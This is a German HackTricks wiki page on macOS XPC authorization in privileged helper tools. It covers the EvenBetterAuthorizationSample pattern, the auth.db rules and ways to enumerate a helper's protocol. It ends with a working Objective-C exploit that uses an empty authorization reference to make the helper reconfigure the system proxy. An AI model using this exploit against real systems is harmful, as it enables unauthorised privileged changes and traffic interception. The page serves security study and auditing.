# macOS XPC Authorization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## XPC Authorization

Apple schlägt auch einen anderen Weg vor, um zu authentifizieren, ob der verbindende Prozess **Berechtigungen hat, um eine exponierte XPC-Methode aufzurufen**.

Wenn eine Anwendung **Aktionen als privilegierter Benutzer ausführen** muss, installiert sie normalerweise ein HelperTool als XPC-Dienst, der als Root ausgeführt wird und von der App aufgerufen werden kann, um diese Aktionen auszuführen, anstatt die App als privilegierten Benutzer auszuführen. Die App, die den Dienst aufruft, sollte jedoch über ausreichende Berechtigungen verfügen.

### ShouldAcceptNewConnection immer YES

Ein Beispiel findet sich in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` versucht es, sich mit dem **HelperTool** zu **verbinden**. Und in `HelperTool/HelperTool.m` wird die Funktion **`shouldAcceptNewConnection`** **keine** der zuvor angegebenen Anforderungen **überprüfen**. Sie wird immer YES zurückgeben:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Für weitere Informationen darüber, wie man dies richtig konfiguriert, siehe:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### Anwendungsrechte

Es gibt jedoch eine **Autorisierung, die stattfindet, wenn eine Methode des HelperTools aufgerufen wird**.

Die Funktion **`applicationDidFinishLaunching`** aus `App/AppDelegate.m` erstellt nach dem Start der App eine leere Autorisierungsreferenz. Dies sollte immer funktionieren.\
Dann wird versucht, **einige Rechte** zu dieser Autorisierungsreferenz hinzuzufügen, indem `setupAuthorizationRights` aufgerufen wird:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Die Funktion `setupAuthorizationRights` aus `Common/Common.m` wird die Rechte der Anwendung in der Authentifizierungsdatenbank `/var/db/auth.db` speichern. Beachten Sie, dass sie nur die Rechte hinzufügt, die noch nicht in der Datenbank vorhanden sind:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Die Funktion `enumerateRightsUsingBlock` wird verwendet, um die Berechtigungen von Anwendungen zu erhalten, die in `commandInfo` definiert sind:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Dies bedeutet, dass am Ende dieses Prozesses die in `commandInfo` deklarierten Berechtigungen in `/var/db/auth.db` gespeichert werden. Beachten Sie, dass Sie dort für **jede Methode**, die **Authentifizierung erfordert**, den **Berechtigungsnamen** und den **`kCommandKeyAuthRightDefault`** finden können. Letzterer **zeigt an, wer dieses Recht erhalten kann**.

Es gibt verschiedene Bereiche, um anzugeben, wer auf ein Recht zugreifen kann. Einige davon sind in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) definiert (Sie können [alle hier finden](https://www.dssw.co.uk/reference/authorization-rights/)), aber zusammenfassend:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Wert</th><th>Beschreibung</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Jeder</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niemand</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Der aktuelle Benutzer muss ein Administrator sein (innerhalb der Administratorgruppe)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Benutzer zur Authentifizierung auffordern.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Benutzer zur Authentifizierung auffordern. Er muss ein Administrator sein (innerhalb der Administratorgruppe)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Regeln angeben</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Zusätzliche Kommentare zum Recht angeben</td></tr></tbody></table>

### Rechteüberprüfung

In `HelperTool/HelperTool.m` überprüft die Funktion **`readLicenseKeyAuthorization`**, ob der Aufrufer berechtigt ist, **eine solche Methode auszuführen**, indem sie die Funktion **`checkAuthorization`** aufruft. Diese Funktion überprüft, ob die **authData**, die vom aufrufenden Prozess gesendet wird, ein **korrektes Format** hat, und überprüft dann, **was benötigt wird, um das Recht** zu erhalten, die spezifische Methode aufzurufen. Wenn alles gut geht, wird der **zurückgegebene `error` `nil` sein**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Beachten Sie, dass die Funktion `authorizationRightForCommand` nur das zuvor kommentierte Objekt **`commandInfo`** überprüft, um **die Anforderungen zu überprüfen, um das Recht** zu erhalten, diese Methode aufzurufen. Dann wird sie **`AuthorizationCopyRights`** aufrufen, um zu überprüfen, **ob es die Rechte hat**, die Funktion aufzurufen (beachten Sie, dass die Flags die Interaktion mit dem Benutzer erlauben).

In diesem Fall ist `kCommandKeyAuthRightDefault` definiert als `@kAuthorizationRuleClassAllow`, um die Funktion `readLicenseKeyAuthorization` aufzurufen. So **kann es jeder aufrufen**.

### DB Informationen

Es wurde erwähnt, dass diese Informationen in `/var/db/auth.db` gespeichert sind. Sie können alle gespeicherten Regeln mit folgendem Befehl auflisten:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Dann können Sie lesen, wer auf das Recht zugreifen kann mit:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive Rechte

Sie können **alle Berechtigungskonfigurationen** [**hier**](https://www.dssw.co.uk/reference/authorization-rights/) finden, aber die Kombinationen, die keine Benutzerinteraktion erfordern, wären:

1. **'authenticate-user': 'false'**
* Dies ist der direkteste Schlüssel. Wenn er auf `false` gesetzt ist, bedeutet dies, dass ein Benutzer keine Authentifizierung bereitstellen muss, um dieses Recht zu erhalten.
* Dies wird **in Kombination mit einem der 2 unten oder zur Angabe einer Gruppe** verwendet, zu der der Benutzer gehören muss.
2. **'allow-root': 'true'**
* Wenn ein Benutzer als Root-Benutzer (der erhöhte Berechtigungen hat) arbeitet und dieser Schlüssel auf `true` gesetzt ist, könnte der Root-Benutzer potenziell dieses Recht ohne weitere Authentifizierung erhalten. In der Regel erfordert der Zugang zu einem Root-Benutzerstatus jedoch bereits eine Authentifizierung, sodass dies für die meisten Benutzer kein "keine Authentifizierung"-Szenario ist.
3. **'session-owner': 'true'**
* Wenn auf `true` gesetzt, würde der Besitzer der Sitzung (der aktuell angemeldete Benutzer) automatisch dieses Recht erhalten. Dies könnte zusätzliche Authentifizierung umgehen, wenn der Benutzer bereits angemeldet ist.
4. **'shared': 'true'**
* Dieser Schlüssel gewährt keine Rechte ohne Authentifizierung. Stattdessen bedeutet es, wenn er auf `true` gesetzt ist, dass, sobald das Recht authentifiziert wurde, es unter mehreren Prozessen geteilt werden kann, ohne dass jeder einzelne sich erneut authentifizieren muss. Aber die ursprüngliche Gewährung des Rechts würde weiterhin eine Authentifizierung erfordern, es sei denn, sie wird mit anderen Schlüsseln wie `'authenticate-user': 'false'` kombiniert.

Sie können [**dieses Skript verwenden**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9), um die interessanten Rechte zu erhalten:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Umkehrung der Autorisierung

### Überprüfen, ob EvenBetterAuthorization verwendet wird

Wenn Sie die Funktion **`[HelperTool checkAuthorization:command:]`** finden, ist es wahrscheinlich, dass der Prozess das zuvor erwähnte Schema für die Autorisierung verwendet:

<figure><img src="../../../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Wenn diese Funktion Funktionen wie `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` aufruft, verwendet sie [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Überprüfen Sie die **`/var/db/auth.db`**, um festzustellen, ob es möglich ist, Berechtigungen zu erhalten, um einige privilegierte Aktionen ohne Benutzerinteraktion auszuführen.

### Protokollkommunikation

Dann müssen Sie das Protokollschema finden, um eine Kommunikation mit dem XPC-Dienst herstellen zu können.

Die Funktion **`shouldAcceptNewConnection`** zeigt das exportierte Protokoll an:

<figure><img src="../../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

In diesem Fall haben wir dasselbe wie im EvenBetterAuthorizationSample, [**überprüfen Sie diese Zeile**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Wenn Sie den Namen des verwendeten Protokolls kennen, ist es möglich, **seine Header-Definition zu dumpen** mit:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Zuletzt müssen wir nur den **Namen des exponierten Mach-Dienstes** wissen, um eine Kommunikation mit ihm herzustellen. Es gibt mehrere Möglichkeiten, dies herauszufinden:

* In der **`[HelperTool init]`**, wo Sie den verwendeten Mach-Dienst sehen können:

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

* In der launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit-Beispiel

In diesem Beispiel wird erstellt:

* Die Definition des Protokolls mit den Funktionen
* Ein leeres Auth, um um Zugriff zu bitten
* Eine Verbindung zum XPC-Dienst
* Ein Aufruf der Funktion, wenn die Verbindung erfolgreich war
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Andere XPC-Berechtigungshelfer missbraucht

* [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm\_source=pocket\_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm\_source=pocket\_shared)

## Referenzen

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
